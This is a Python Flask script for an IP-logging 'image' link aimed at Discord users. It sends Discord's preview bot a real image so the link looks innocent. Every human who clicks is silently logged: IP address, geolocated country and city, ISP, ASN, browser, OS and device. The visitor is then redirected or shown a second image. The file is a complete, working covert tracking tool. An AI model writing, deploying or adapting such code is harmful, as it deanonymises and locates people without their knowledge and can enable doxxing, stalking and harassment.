
from flask import Flask, request, send_file, redirect
from user_agents import parse
from ipaddress import ip_address
import requests
import logging

app = Flask(__name__)

logging.basicConfig(
    level=logging.INFO,
    format="%(message)s"
)

GEO_API = "http://ip-api.com/json/"
GEO_FIELDS = "status,country,city,isp,as"
TRUST_PROXY_HEADERS = False


def get_client_ip():
    if TRUST_PROXY_HEADERS:
        forwarded = request.headers.get("X-Forwarded-For", "")
        candidate = forwarded.split(",")[0].strip() if forwarded else request.remote_addr
    else:
        candidate = request.remote_addr

    if not candidate:
        return "Unknown"

    try:
        return str(ip_address(candidate))
    except ValueError:
        return "Unknown"


def get_ip_info(ip):
    try:
        parsed_ip = ip_address(ip)

        if not parsed_ip.is_global:
            return {
                "country": "Unavailable",
                "city": "Unavailable",
                "isp": "Unavailable",
                "asn": "Unavailable",
            }

        response = requests.get(
            f"{GEO_API}{ip}",
            params={"fields": GEO_FIELDS},
            timeout=3
        )
        response.raise_for_status()
        data = response.json()

        if data.get("status") != "success":
            raise ValueError("Geolocation lookup failed")

        return {
            "country": data.get("country") or "Unknown",
            "city": data.get("city") or "Unknown",
            "isp": data.get("isp") or "Unknown",
            "asn": data.get("as") or "Unknown",
        }

    except (requests.RequestException, ValueError):
        return {
            "country": "Unavailable",
            "city": "Unavailable",
            "isp": "Unavailable",
            "asn": "Unavailable",
        }


def log_request(is_discord=False):
    ip = get_client_ip()
    info = get_ip_info(ip)

    if is_discord:
        logging.info("[LOG] Discord Bot Detected")
    else:
        ua_string = request.headers.get("User-Agent", "")
        ua = parse(ua_string)

        browser = (
            f"{ua.browser.family} {ua.browser.version_string}"
            if ua.browser.family != "Other"
            else "Unknown"
        )
        os_name = (
            f"{ua.os.family} {ua.os.version_string}"
            if ua.os.family != "Other"
            else "Unknown"
        )
        device = ua.device.family or "Unknown"

        logging.info(
            f"[LOG] User Browser Detected "
            f"(Browser: {browser} | OS: {os_name} | Device: {device})"
        )

    logging.info(f" IP: {ip}")
    logging.info(f" Country/City: {info['country']} / {info['city']}")
    logging.info(f" ISP: {info['isp']}")
    logging.info(f" ASN: {info['asn']}")


def is_uptime_robot():
    return "UptimeRobot" in request.headers.get("User-Agent", "")


@app.route("/image.png")
def conditional_serve():
    if is_uptime_robot():
        return "OK", 200

    user_agent = request.headers.get("User-Agent", "")

    if "Discordbot" in user_agent:
        log_request(is_discord=True)
        return send_file("actual_image.png", mimetype="image/png")

    log_request()
    return redirect("https://wikipedia.org")


@app.route("/image2.png")
def separate_log_behavior():
    if is_uptime_robot():
        return "OK", 200

    user_agent = request.headers.get("User-Agent", "")

    if "Discordbot" in user_agent:
        log_request(is_discord=True)
        return "<html><body></body></html>", 200

    log_request()
    return send_file("actual_image2.png", mimetype="image/png")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
